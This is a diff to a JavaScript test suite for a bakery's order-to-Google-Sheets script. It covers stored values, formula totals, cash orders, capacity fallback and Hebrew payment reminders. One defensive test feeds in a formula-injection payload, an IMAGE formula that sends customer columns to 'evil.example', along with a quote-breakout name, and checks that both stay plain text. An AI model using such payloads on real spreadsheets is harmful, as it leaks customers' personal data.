@@ -31,11 +31,13 @@ function a1(ref) {
   return [r1, c1, r2 - r1 + 1, c2 - c1 + 1];
 }
 
-// Mimic how Sheets stores typed values: a leading ' keeps text, number-like text becomes a number.
-function stored(v) {
+// Mimic how Sheets stores values written with setValues ("as if typed"):
+// plain-text columns keep text; a leading ' keeps text; = + - @ start a formula; number-like text becomes a number.
+function stored(sheet, r, c, v) {
   if (typeof v !== 'string') return v;
+  if (sheet.textCols.has(c) && r > 1) return v;
   if (v.startsWith("'")) return v.slice(1);
-  if (v.startsWith('=')) return v;
+  if (/^[=+\-@]/.test(v) && !/^-?\d+(\.\d+)?$/.test(v)) { sheet.formulas.set(r + ',' + c, v); return v; }
   if (/^-?\d+(\.\d+)?$/.test(v)) return Number(v);
   return v;
 }
@@ -43,7 +45,7 @@ function stored(v) {
 function fakeSheet(name) {
   const cells = new Map();
   const sheet = {
-    name, formulas: new Map(), checkboxes: new Set(), validations: [], rules: [],
+    name, formulas: new Map(), checkboxes: new Set(), validations: [], rules: [], textCols: new Set(),
     get(r, c) { return cells.has(r + ',' + c) ? cells.get(r + ',' + c) : ''; },
     set(r, c, v) { cells.set(r + ',' + c, v); },
     getLastRow() {
@@ -60,15 +62,16 @@ function fakeSheet(name) {
         getValue: () => sheet.get(r, c),
         setValues: (rows) => {
           assert.equal(rows.length, nr); assert.equal(rows[0].length, nc, 'setValues width must match range');
-          rows.forEach((row, i) => row.forEach((v, j) => sheet.set(r + i, c + j, stored(v))));
+          rows.forEach((row, i) => row.forEach((v, j) => sheet.set(r + i, c + j, stored(sheet, r + i, c + j, v))));
           return range;
         },
-        setValue: (v) => { sheet.set(r, c, stored(v)); return range; },
+        setValue: (v) => { sheet.set(r, c, stored(sheet, r, c, v)); return range; },
         setFormula: (f) => { sheet.formulas.set(r + ',' + c, f); sheet.set(r, c, f); return range; },
         insertCheckboxes: () => { sheet.checkboxes.add(r + ',' + c); return range; },
         setDataValidation: (v) => { sheet.validations.push({ r, c, nr, nc, v }); return range; }
       };
-      for (const m of ['setFontWeight', 'setBackground', 'setNumberFormat']) range[m] = () => range;
+      range.setNumberFormat = (fmt) => { if (fmt === '@' && nc === 1) sheet.textCols.add(c); return range; };
+      for (const m of ['setFontWeight', 'setBackground']) range[m] = () => range;
       return range;
     },
     setFrozenRows() {}, setFrozenColumns() {}, setColumnWidth() {},
@@ -154,7 +157,7 @@ test('setup creates the order, test, settings and summary tabs', () => {
   assert.equal(orders.rules.length, 2, 'unpaid and canceled highlighting');
   const summary = env.sheets.get('Bake summary').formulas.get('2,1');
   assert.match(summary, /^=QUERY\('Website orders'!A2:Z, "select C, sum\(J\), sum\(K\), sum\(L\), sum\(M\), sum\(N\), sum\(O\), sum\(P\), sum\(Q\) where C is not null and X <> 'canceled' group by C/);
-  assert.match(env.sheets.get('Bake summary').formulas.get('2,12'), /where C is not null and W = false and X <> 'canceled'/);
+  assert.match(env.sheets.get('Bake summary').formulas.get('2,12'), /where C is not null and I = 'Bit' and not W = true and X <> 'canceled'/);
   // Running setup again keeps settings Eliana changed
   env.sheets.get('Settings').set(2, 2, 12);
   env.ctx.setup();
@@ -179,15 +182,53 @@ test('an order lands in the sheet as one complete row', () => {
   assert.equal(row['Plain sourdough'], 1);
   assert.equal(row.Pesto, 1);
   assert.equal(row.Garlic, '');
-  assert.equal(row.Loaves, 2);
-  assert.equal(row['Total ₪'], 90);
-  assert.equal(row['Delivery ₪'], 5);
+  // Totals are formulas, so they follow quantities edited by hand
+  assert.equal(row.Loaves, '=SUM(J2:P2)');
+  assert.equal(row['Subtotal ₪'], '=N(J2)*35+N(K2)*42+N(L2)*44+N(M2)*42+N(N2)*44+N(O2)*44+N(P2)*50');
+  assert.equal(row['Delivery ₪'], '=IF(AND(G2="Delivery",R2<100),5,0)');
+  assert.equal(row['Total ₪'], '=R2+S2');
+  assert.equal(row.Notes, 'no sesame');
   assert.equal(row.Paid, false);
   assert.equal(row.Status, 'new');
-  assert.match(row['Payment reminder'], /^=HYPERLINK\("https:\/\/wa\.me\/972540000000\?text=[^"]+","Send reminder"\)$/);
+  assert.equal(row['Payment reminder'],
+    '=IF(W2=TRUE,"",HYPERLINK("https://wa.me/972540000000?text="&ENCODEURL("Hi Test Customer, this is The Bread Club. ' +
+    'A quick reminder that your order (#1001) for Tuesday 10.11 comes to ₪"&T2&". You can pay by Bit to 054-911-2175 ' +
+    '(please write your full name in the note). Thank you"),"Send reminder"))');
   assert.equal(row['Order ID'], 'sheet-row-0001');
   assert.ok(env.sheets.get('Website orders').checkboxes.has('2,' + (env.ctx.COLUMNS.indexOf('Paid') + 1)));
   assert.equal(env.lock.held, false, 'lock released');
+});
+
+test('customer text can never become a formula in the sheet', () => {
+  const env = makeEnv(THURSDAY);
+  env.ctx.setup();
+  const evil = '=IMAGE("https://evil.example/?"&TEXTJOIN(",",1,E2:F200))';
+  const r = env.post(order({ name: '=HYPERLINK("x") "Bob"', address: '+972 street 4', notes: evil }));
+  assert.equal(r.ok, true);
+  const sheet = env.sheets.get('Website orders');
+  const cols = env.ctx.COLUMNS;
+  for (const c of ['Name', 'Address', 'Notes']) {
+    assert.equal(sheet.formulas.has('2,' + (cols.indexOf(c) + 1)), false, c + ' must stay text');
+  }
+  const row = env.row('Website orders', 2);
+  assert.equal(row.Name, '=HYPERLINK("x") "Bob"');
+  assert.equal(row.Address, '+972 street 4');
+  assert.equal(row.Notes, evil);
+  // quotes in a name cannot break out of the reminder formula
+  assert.match(row['Payment reminder'], /ENCODEURL\("Hi =HYPERLINK\(""x""\) ""Bob"", this is/);
+  env.post(order({ notes: '- no sesame' }));
+  assert.equal(env.row('Website orders', 3).Notes, '- no sesame');
+});
+
+test('cash orders say "Cash at door" and get no payment reminder', () => {
+  const env = makeEnv(THURSDAY);
+  env.ctx.setup();
+  env.post(order({ payment: 'cash' }));
+  const row = env.row('Website orders', 2);
+  assert.equal(row['Pays by'], 'Cash at door');
+  assert.equal(row['Payment reminder'], '');
+  const dup = env.post(Object.assign(order(), { orderId: row['Order ID'] }));
+  assert.equal(dup.payment, 'cash');
 });
 
 test('retrying the same order does not add a second row', () => {
@@ -223,7 +264,7 @@ test('an order canceled in the sheet frees its loaves; hand-typed rows count', (
   env.post(order({ items: { plain: 17 } }));
   // Eliana types a phone order by hand (no order ID) for 1 loaf
   const cols = env.ctx.COLUMNS;
-  sheet.set(3, 1, 7); sheet.set(3, cols.indexOf('Delivery date') + 1, '2026-11-10');
+  sheet.set(3, 1, 7); sheet.set(3, cols.indexOf('Delivery date') + 1, "'2026-11-10");
   sheet.set(3, cols.indexOf('Loaves') + 1, 1); sheet.set(3, cols.indexOf('Status') + 1, 'New');
   assert.equal(env.post(order({ items: { plain: 1 } })).error, 'full');
   sheet.set(2, cols.indexOf('Status') + 1, 'canceled');
@@ -232,11 +273,43 @@ test('an order canceled in the sheet frees its loaves; hand-typed rows count', (
   assert.equal(r.orderNumber, 1002);
 });
 
-test('a bad capacity value in Settings falls back to 18', () => {
+test('a bad or blank capacity value in Settings falls back to 18', () => {
   const env = makeEnv(THURSDAY);
   env.ctx.setup();
-  env.sheets.get('Settings').set(2, 2, 'eighteen');
-  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 18);
+  for (const v of ['eighteen', '', -1, 2.5]) {
+    env.sheets.get('Settings').set(2, 2, v);
+    assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 18, JSON.stringify(v));
+  }
+});
+
+test('editing quantities in the sheet changes the day count and the total', () => {
+  const env = makeEnv(THURSDAY);
+  env.ctx.setup();
+  const sheet = env.sheets.get('Website orders');
+  const cols = env.ctx.COLUMNS;
+  const o = order({ items: { plain: 10 } });
+  env.post(o);
+  sheet.set(2, cols.indexOf('Plain sourdough') + 1, 4); // Eliana changes 10 -> 4
+  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 14);
+  const dup = env.post(o);
+  assert.equal(dup.loaves, 4);
+  assert.equal(dup.total, 140, '4 x 35, free delivery from 100');
+});
+
+test('hand-typed rows: phone without leading 0 and Loaves-only rows are understood', () => {
+  const env = makeEnv(THURSDAY);
+  env.ctx.setup();
+  const sheet = env.sheets.get('Website orders');
+  const cols = env.ctx.COLUMNS;
+  for (let i = 0; i < 3; i++) {
+    sheet.set(2 + i, 1, 900 + i);
+    sheet.set(2 + i, cols.indexOf('Delivery date') + 1, '2026-11-10');
+    sheet.set(2 + i, cols.indexOf('Phone') + 1, 540000000); // number: leading 0 lost
+    sheet.set(2 + i, cols.indexOf('Loaves') + 1, 1);
+    sheet.set(2 + i, cols.indexOf('Status') + 1, 'new');
+  }
+  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 15);
+  assert.deepEqual(env.post(order()), { ok: false, error: 'limit', date: '2026-11-10' }, 'same phone, 4th order that day');
 });
 
 test('test orders go to the Test orders tab only', () => {
@@ -265,11 +338,10 @@ test('bad requests, busy lock and missing setup fail safely', () => {
 test('Hebrew orders are labelled and get a Hebrew reminder', () => {
   const env = makeEnv(THURSDAY);
   env.ctx.setup();
-  env.post(order({ lang: 'he', method: 'pickup', payment: 'cash' }));
+  env.post(order({ lang: 'he', method: 'pickup' }));
   const row = env.row('Website orders', 2);
   assert.equal(row.Language, 'Hebrew');
-  assert.equal(row['Pays by'], 'Cash');
   assert.equal(row['Pickup / delivery'], 'Pickup');
   assert.equal(row.Address, '');
-  assert.match(decodeURIComponent(row['Payment reminder']), /תזכורת קטנה/);
+  assert.match(row['Payment reminder'], /ENCODEURL\("היי Test Customer, כאן The Bread Club\. תזכורת קטנה: ההזמנה שלך \(#1001\) ליום שלישי 10\.11 יוצאת ₪"&T2&"\. אפשר לשלם בביט/);
 });
